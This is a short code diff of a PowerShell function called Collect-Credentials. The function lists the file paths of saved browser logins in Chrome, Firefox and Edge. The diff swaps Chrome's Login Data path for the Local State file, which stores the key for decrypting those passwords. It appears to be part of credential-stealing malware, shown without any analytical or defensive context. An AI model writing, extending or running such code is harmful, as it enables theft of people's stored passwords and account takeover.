@@ -1,5 +1,5 @@
 function Collect-Credentials {
-    $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+    $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
     $firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
     $firefoxLoginData = "$firefoxProfilePath\*\logins.json"
     $edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
